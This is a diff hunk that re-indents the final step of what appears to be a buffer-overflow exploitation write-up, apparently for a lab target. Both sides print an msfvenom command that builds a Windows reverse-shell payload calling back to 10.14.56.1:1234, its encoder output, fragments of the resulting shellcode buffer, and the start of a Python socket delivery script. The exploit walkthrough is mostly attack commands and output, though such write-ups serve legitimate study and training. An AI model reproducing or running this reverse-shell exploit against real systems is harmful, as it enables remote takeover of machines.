@@ -312,31 +312,31 @@
 
             [>>] EIP: 080416BF
 
-[Final Step] Exploit
+    [Final Step] Exploit
 
-[+] Now we have enough information, let's exploit the target
-
-    # msfvenom -p windows/shell_reverse_tcp LHOST=10.14.56.1 LPORT=1234 -f exe -f python -b "\x00\x0a" EXITFUNC=thread       
+        [+] Now we have enough information, let's exploit the target
     
-        [Note] Null Bytes (\x00) && Newline (\x0a) you should avoid them
-
-        [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-        [-] No arch selected, selecting arch: x86 from the payload
-        Found 12 compatible encoders
-        Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-        x86/shikata_ga_nai succeeded with size 351 (iteration=0)
-        x86/shikata_ga_nai chosen with final size 351
-        Payload size: 351 bytes
-        Final size of python file: 1745 bytes
-        buf =  b""
-        buf += b"\xdb\xc7\xba\xb8\x9e\x3d\xea\xd9\x74\x24\xf4\x58"
-        buf += b"\x33\xc9\xb1\x52\x83\xc0\x04\x31\x50\x13\x03\xe8"
-        ...
-        buf += b"\x92\x93\x76\x2f\x1f\xfe\x88\x9a\x5c\x07\x0b\x2e"
-        buf += b"\x1d\xfc\x13\x5b\x18\xb8\x93\xb0\x50\xd1\x71\xb6"
-        buf += b"\xc7\xd2\x53"
-
-        [>>]    import socket
+        # msfvenom -p windows/shell_reverse_tcp LHOST=10.14.56.1 LPORT=1234 -f exe -f python -b "\x00\x0a" EXITFUNC=thread       
+        
+            [Note] Null Bytes (\x00) && Newline (\x0a) you should avoid them
+    
+            [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+            [-] No arch selected, selecting arch: x86 from the payload
+            Found 12 compatible encoders
+            Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+            x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+            x86/shikata_ga_nai chosen with final size 351
+            Payload size: 351 bytes
+            Final size of python file: 1745 bytes
+            buf =  b""
+            buf += b"\xdb\xc7\xba\xb8\x9e\x3d\xea\xd9\x74\x24\xf4\x58"
+            buf += b"\x33\xc9\xb1\x52\x83\xc0\x04\x31\x50\x13\x03\xe8"
+            ...
+            buf += b"\x92\x93\x76\x2f\x1f\xfe\x88\x9a\x5c\x07\x0b\x2e"
+            buf += b"\x1d\xfc\x13\x5b\x18\xb8\x93\xb0\x50\xd1\x71\xb6"
+            buf += b"\xc7\xd2\x53"
+    
+            [>>]    import socket
 
                 buf =  b""
                 buf += b"\xdb\xc7\xba\xb8\x9e\x3d\xea\xd9\x74\x24\xf4\x58"
